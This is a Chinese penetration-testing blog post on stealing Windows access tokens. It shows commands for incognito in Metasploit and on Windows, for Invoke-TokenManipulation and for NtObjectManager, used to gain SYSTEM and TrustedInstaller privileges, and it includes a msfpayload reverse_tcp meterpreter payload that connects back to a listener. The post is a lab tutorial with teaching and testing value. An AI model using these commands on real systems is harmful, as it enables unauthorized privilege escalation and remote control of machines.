@@ -1,0 +1,377 @@
+<article class="post">
+  <h1>渗透技巧——Token窃取与利用</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%99%8D%E6%9D%83%E5%90%AF%E5%8A%A8/">《渗透技巧——程序的降权启动》</a>介绍了使用SelectMyParent降权的方法，本质上是通过token窃取实现的。这一次将要对token窃取和利用做进一步介绍，测试常用工具，分享利用技巧。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容;</p>
+
+<ul>
+  <li>Token简介</li>
+  <li>Metasploit中的incognito</li>
+  <li>Windows平台下的incognito</li>
+  <li>Invoke-TokenManipulation.ps1用法</li>
+  <li>利用token获得system权限</li>
+  <li>利用token获得TrustedInstaller权限</li>
+</ul>
+
+<h2 id="0x02-token简介">0x02 Token简介</h2>
+<hr>
+
+<p>Windows有两种类型的Token：</p>
+
+<ul>
+  <li>
+    <p>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</p>
+  </li>
+  <li>
+    <p>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</p>
+  </li>
+</ul>
+
+<p><strong>注：</strong></p>
+
+<p>两种token只在系统重启后清除</p>
+
+<p>具有<code class="language-plaintext highlighter-rouge">Delegation token</code>的用户在注销后，该Token将变成<code class="language-plaintext highlighter-rouge">Impersonation token</code>，依旧有效</p>
+
+<h3 id="实际测试">实际测试</h3>
+
+<p>使用<code class="language-plaintext highlighter-rouge">Test\a</code>登录后注销，再使用<code class="language-plaintext highlighter-rouge">administrator</code>登录</p>
+
+<p>查看token：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe list_tokens -u
+</code></pre></div></div>
+
+<p>能够获取到已注销用户<code class="language-plaintext highlighter-rouge">Test\a</code>的token，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/2-1.png" alt="Alt text"></p>
+
+<p>利用该token执行calc.exe:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe execute -c "TEST\a" calc.exe
+</code></pre></div></div>
+
+<p>后台显示进程calc.exe的用户名为<code class="language-plaintext highlighter-rouge">a</code>，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/2-2.png" alt="Alt text"></p>
+
+<h2 id="0x03-metasploit中的incognito">0x03 Metasploit中的incognito</h2>
+<hr>
+
+<p>在Metasploit中，可使用incognito实现token窃取，常用命令如下：</p>
+
+<p>加载incognito：<code class="language-plaintext highlighter-rouge">load incognito</code></p>
+
+<p>列举token：<code class="language-plaintext highlighter-rouge">list_tokens -u</code></p>
+
+<p>查看当前token：<code class="language-plaintext highlighter-rouge">getuid</code></p>
+
+<p>提示至system权限：<code class="language-plaintext highlighter-rouge">getsystem</code></p>
+
+<p>token窃取：<code class="language-plaintext highlighter-rouge">impersonate_token "NT AUTHORITY\\SYSTEM"</code></p>
+
+<p>从进程窃取：<code class="language-plaintext highlighter-rouge">steal_token 1252</code></p>
+
+<p>返回之前token：<code class="language-plaintext highlighter-rouge">rev2self</code> or <code class="language-plaintext highlighter-rouge">drop_token</code></p>
+
+<h3 id="实际测试-1">实际测试</h3>
+
+<p>Client：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfpayload -p windows/meterpreter/reverse_tcp LHOST=192.168.81.142 LPORT=44444 X &gt;test.exe
+</code></pre></div></div>
+
+<p>Server：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LPORT 44444
+set LHOST 192.168.81.142
+exploit
+</code></pre></div></div>
+
+<p>执行<code class="language-plaintext highlighter-rouge">getsystem</code>获得system权限</p>
+
+<p>pid 1252的权限为当前用户，执行<code class="language-plaintext highlighter-rouge">steal_token 1252</code>， 将权限切换到<code class="language-plaintext highlighter-rouge">WIN-R7MM90ERBMD\a</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/2-3.png" alt="Alt text"></p>
+
+<p>执行<code class="language-plaintext highlighter-rouge">impersonate_token "NT AUTHORITY\\SYSTEM"</code>将权限切换至<code class="language-plaintext highlighter-rouge">system</code></p>
+
+<p><strong>注：</strong></p>
+
+<p>需要加引号和双斜杠，<code class="language-plaintext highlighter-rouge">"NT AUTHORITY\\SYSTEM"</code></p>
+
+<p>执行<code class="language-plaintext highlighter-rouge">rev2self</code>返回之前token，为<code class="language-plaintext highlighter-rouge">WIN-R7MM90ERBMD\a</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/2-4.png" alt="Alt text"></p>
+
+<p>通过以上演示，成功通过token窃取实现权限切换</p>
+
+<h2 id="0x04-windows平台下的incognito">0x04 Windows平台下的incognito</h2>
+<hr>
+
+<p>Metasploit中的incognito，是从windows平台下的incognito移植过来的，下面介绍一下windows平台下的incognito</p>
+
+<p><strong>下载地址：</strong></p>
+
+<p>https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</p>
+
+<p><strong>参考手册：</strong></p>
+
+<p>http://labs.mwrinfosecurity.com/assets/142/mwri_security-implications-of-windows-access-tokens_2008-04-14.pdf</p>
+
+<p>常见用法如下：</p>
+
+<p>列举token：<code class="language-plaintext highlighter-rouge">incognito.exe list_tokens -u</code></p>
+
+<p>复制token：<code class="language-plaintext highlighter-rouge">incognito.exe execute [options] &lt;token&gt; &lt;command&gt;</code></p>
+
+<h3 id="实际测试-2">实际测试</h3>
+
+<p>列举token：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe list_tokens -u
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/3-1.png" alt="Alt text"></p>
+
+<p>提权至system：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/3-2.png" alt="Alt text"></p>
+
+<p>降权至当前用户：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe execute -c "WIN-R7MM90ERBMD\a" cmd.exe
+</code></pre></div></div>
+
+<p>伪造用户：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe execute -c "WIN-R7MM90ERBMD\b" cmd.exe
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/3-3.png" alt="Alt text"></p>
+
+<h2 id="0x05-invoke-tokenmanipulationps1用法">0x05 Invoke-TokenManipulation.ps1用法</h2>
+<hr>
+
+<p><strong>下载地址：</strong></p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</p>
+
+<p>原理和功能同incognito类似，能够实际提权和降权</p>
+
+<p>列举token：<code class="language-plaintext highlighter-rouge">Invoke-TokenManipulation -Enumerate</code></p>
+
+<p>提权至system：<code class="language-plaintext highlighter-rouge">Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authority\system"</code></p>
+
+<p>复制进程token：<code class="language-plaintext highlighter-rouge">Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 500</code></p>
+
+<p>复制线程token：<code class="language-plaintext highlighter-rouge">Invoke-TokenManipulation -CreateProcess "cmd.exe" -ThreadId 500</code></p>
+
+<p>还有更多用法可参考该脚本说明</p>
+
+<p>实际测试略</p>
+
+<h2 id="0x06-利用token获得trustedinstaller权限">0x06 利用token获得TrustedInstaller权限</h2>
+<hr>
+
+<p>在Windows系统中，即使获得了管理员权限和system权限，也不能修改系统文件</p>
+
+<p>因为Windows系统的最高权限为<code class="language-plaintext highlighter-rouge">TrustedInstaller</code></p>
+
+<p>例如路径<code class="language-plaintext highlighter-rouge">C:\Windows\servicing</code></p>
+
+<p>使用system权限无法在该路径创建文件</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/4-1.png" alt="Alt text"></p>
+
+<p>查看文件夹属性，显示system不具有写入权限，只有<code class="language-plaintext highlighter-rouge">TrustedInstaller</code>可以</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/4-2.png" alt="Alt text"></p>
+
+<p>关于如何获得TrustedInstaller权限，可参考James Forshaw的这篇文章，很值得学习</p>
+
+<p>https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html</p>
+
+<p>这里对其中的一个实例做测试，进而找到其他实现方法</p>
+
+<p>启动TrustedInstaller服务会启动进程TrustedInstaller.exe，位置为<code class="language-plaintext highlighter-rouge">C:\Windows\servicing\TrustedInstaller.exe</code>，查看该程序权限：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner
+</code></pre></div></div>
+
+<p>显示为<code class="language-plaintext highlighter-rouge">NT SERVICE\TrustedInstaller</code>，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/4-3.png" alt="Alt text"></p>
+
+<p>James Forshaw的实现思路为借用TrustedInstaller.exe的token创建子进程，这样子进程就有了TrustedInstaller权限，具体powershell代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-NtTokenPrivilege SeDebugPrivilege
+$p = Get-NtProcess -Name TrustedInstaller.exe
+$proc = New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p
+</code></pre></div></div>
+
+<p>powershell默认不支持<code class="language-plaintext highlighter-rouge">Set-NtTokenPrivilege</code>命令，该模块需要下载安装</p>
+
+<p><strong>下载地址：</strong></p>
+
+<p>https://www.powershellgallery.com/packages/NtObjectManager/1.1.1</p>
+
+<p>安装命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Save-Module -Name NtObjectManager -Path c:\test
+Install-Module -Name NtObjectManager
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>Save-Module需要powershell v5.0支持，详情见：</p>
+
+<p>https://docs.microsoft.com/zh-cn/powershell/gallery/readme</p>
+
+<p>因此测试系统选为Win10，默认powershell版本为5.0</p>
+
+<p>导入该模块需要系统允许执行powershell脚本，因此先执行如下代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-ExecutionPolicy Unrestricted
+</code></pre></div></div>
+
+<p>导入模块NtObjectManager：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module NtObjectManager
+</code></pre></div></div>
+
+<p>执行命令测试：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc.exe start TrustedInstaller
+Set-NtTokenPrivilege SeDebugPrivilege
+$p = Get-NtProcess -Name TrustedInstaller.exe
+$proc = New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p
+</code></pre></div></div>
+
+<p>使用whoami查看当前cmd权限：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /groups /fo list
+</code></pre></div></div>
+
+<p>发现当前cmd.exe在TrustedInstaller组里，成功获得TrustedInstaller权限</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/4-4.png" alt="Alt text"></p>
+
+<p>接着按照James Forshaw文章中更新的内容，学习了Vincent Yiu@vysecurity的方法，使用metasploit下的incognito也能够获得TrustedInstaller权限</p>
+
+<p><strong>地址如下：</strong></p>
+
+<p>https://twitter.com/vysecurity/status/899303538630774787</p>
+
+<p>思路如下：</p>
+
+<ul>
+  <li>启动服务TrustedInstaller</li>
+  <li>使用incognito获取TrustedInstaller.exe的token</li>
+  <li>获得TrustedInstaller权限</li>
+</ul>
+
+<p>使用以下命令：</p>
+
+<ul>
+  <li>load incognito</li>
+  <li>getsytem</li>
+  <li>ps</li>
+  <li>steal_token 3204</li>
+  <li>getuid</li>
+</ul>
+
+<p>按照这个思路，猜测使用SelectMyParent和Invoke-TokenManipulation.ps1也能获得TrustedInstaller权限</p>
+
+<p>下面验证我们的判断</p>
+
+<p><strong>1、SelectMyParent</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc start TrustedInstaller
+SelectMyParent.exe cmd.exe 1700
+</code></pre></div></div>
+
+<p>新的cmd.exe拥有TrustedInstaller权限</p>
+
+<p><strong>2、Invoke-TokenManipulation.ps1</strong></p>
+
+<p>添加如下代码即可：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc.exe start TrustedInstaller
+$id  = Get-Process -name TrustedInstaller* | Select-Object id | ForEach-Object -Process{$_.id}
+Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId $id
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>sc这个命令不能直接在powershell里面运行，powershell会把它当作set-content的别名，可使用sc.exe在powershell里面运行sc命令</p>
+
+<h3 id="验证是否获得trustedinstaller权限的方法">验证是否获得TrustedInstaller权限的方法</h3>
+
+<p><strong>1、对特殊路径写文件</strong></p>
+
+<p>例如<code class="language-plaintext highlighter-rouge">C:\Windows\servicing</code>，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/4-5.png" alt="Alt text"></p>
+
+<p><strong>2、使用powershell</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner
+</code></pre></div></div>
+
+<p>回显为<code class="language-plaintext highlighter-rouge">NT SERVICE\TrustedInstaller</code></p>
+
+<p><strong>3、使用whoami</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /groups | findstr TrustedInstaller
+</code></pre></div></div>
+
+<p>查看是否有回显</p>
+
+<h2 id="0x07-小结">0x07 小结</h2>
+<hr>
+
+<p>本文介绍了token窃取的实现方法，使用多种工具来获得system权限和TrustedInstaller权限。</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on September 30, 2017
+  </div>
+
+  
+</article>
